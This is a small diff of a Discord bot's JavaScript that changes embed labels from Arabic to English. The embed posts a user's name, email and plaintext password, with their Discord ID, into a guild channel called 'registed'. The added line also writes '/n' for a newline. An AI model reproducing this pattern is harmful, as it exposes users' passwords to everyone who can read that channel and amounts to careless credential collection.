@@ -514,7 +514,7 @@ var gg = message.guild.channels.find('name', 'registed')
 if(!gg) return;
 if(gg) {
 gg.send({embed : new Discord.RichEmbed()
-  .setDescription(`** اسم: \n ${lan}\nايمايل :\n ${md} \nكلمة سر :\n ${br}  \nايدي   : ${message.author.id} **`)  
+  .setDescription(`** Name : \n ${lan}\nEmail :\n ${md} \nPassword :\n ${br}  \nid   : /n${message.author.id} **`)  
           .setFooter(`FOX Community©`)
 .setTimestamp()
 });
